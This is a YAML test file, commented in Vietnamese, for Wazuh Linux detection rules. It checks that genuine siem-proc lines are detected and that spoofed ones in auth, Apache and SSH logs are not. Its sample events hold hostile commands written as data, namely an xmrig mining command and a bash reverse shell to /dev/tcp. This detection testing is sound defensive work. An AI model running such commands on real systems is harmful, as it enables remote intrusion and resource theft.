# Ca test cho wazuh/manager/rules/0102-linux.xml (log gốc qua Wazuh thật). Nguồn: tests/legacy/linux.yml + ca biên + ca giả mạo.
# Dòng siem-proc đi vào Wazuh với location=siem-procs (alias của <localfile>), auditd với location audit.log.
# CA ĐẾM (LNX-005): lịch sử đếm của analysisd còn giữ qua các lần chạy trên cùng manager, và logtest luôn là agent 000. Vì vậy mỗi ca đếm
# dùng một location riêng (<thư mục>/siem-procs, hoặc /var/log/audit/<tên>.log) vì rule khai <same_location />, và phải khởi động lại
# manager thử (wzhdev) giữa hai lần chạy cả bộ, nếu không các lần chạy trộn lịch sử với nhau.

# LNX-000: dòng siem-proc từ nguồn siem-procs được giải mã và nhận
- rule: 102000
  log_format: syslog
  location: siem-procs
  events:
  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=ls parent=bash exe=/usr/bin/ls cmd=ls -l'

# giả mạo: dòng siem-proc (đủ tiền tố ossec: output) nằm trong syslog thường -> không rule nào báo
- none:
  - 102000
  - 102001
  - 102002
  - 102003
  - 102004
  - 102005
  - 102006
  - 102011
  - 102013
  - 102014
  - 102016
  - 102015
  - 102023
  log_format: syslog
  location: /var/log/auth.log
  events:
  - 'ossec: output: ''siem-procs'': siem-proc: pid=1000 ppid=900 uid=0 name=xmrig parent=bash exe=/usr/bin/xmrig cmd=./xmrig -o stratum+tcp://pool.example:3333'

# giả mạo: kẻ tấn công đặt chuỗi siem-proc vào URL của web access log
- none:
  - 102000
  - 102001
  - 102002
  - 102003
  - 102004
  - 102005
  - 102006
  - 102011
  - 102013
  - 102014
  - 102016
  - 102015
  - 102023
  log_format: apache
  location: /var/log/apache2/access.log
  events:
  - 203.0.113.9 - - [31/Oct/2026:10:00:00 +0700] "GET /?x=siem-proc:%20pid=1%20ppid=2%20uid=0%20name=sh%20parent=httpd%20exe=/bin/sh%20cmd=bash%20-i%20>&%20/dev/tcp/1.2.3.4/4 HTTP/1.1" 200 12 "-" "curl/8"

# giả mạo: sshd ghi tên người dùng chứa chuỗi siem-proc (không có tiền tố ossec: output)
- none:
  - 102000
  - 102001
  - 102002
  - 102003
  - 102004
  - 102005
  - 102006
  - 102011
  - 102013
  - 102014
  - 102016
  - 102015
  - 102023
  log_format: syslog
  location: /var/log/auth.log
  events:
  - 'Oct 31 10:00:00 host sshd[1234]: Invalid user siem-proc: pid=1 ppid=2 uid=0 name=sh parent=httpd exe=/bin/sh cmd=sh from 203.0.113.9 port 4444'

# LNX-001 siem-proc: bash -i tới /dev/tcp
